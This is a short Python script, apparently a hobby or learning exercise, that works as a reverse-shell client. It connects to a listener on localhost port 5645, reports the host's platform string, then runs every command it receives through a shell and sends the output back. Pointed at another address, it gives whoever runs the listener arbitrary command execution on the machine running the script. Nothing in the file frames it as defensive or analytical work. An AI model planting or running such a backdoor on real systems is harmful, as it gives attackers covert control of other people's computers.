import socket
from subprocess import check_output
from platform import *

s = socket.socket(2, 1)
s.connect(("localhost", 5645))
print("connected to port", 5645,"\n")

while True:
    os_version = platform()
    s.sendall(os_version.encode())
    
    command = s.recv(1024).decode()
    if command == "c":
        continue
    try:
        result = check_output(command,shell=True)
        s.sendall(result)
    except:
        s.sendall("your command is wrong\n".encode())

s.close()
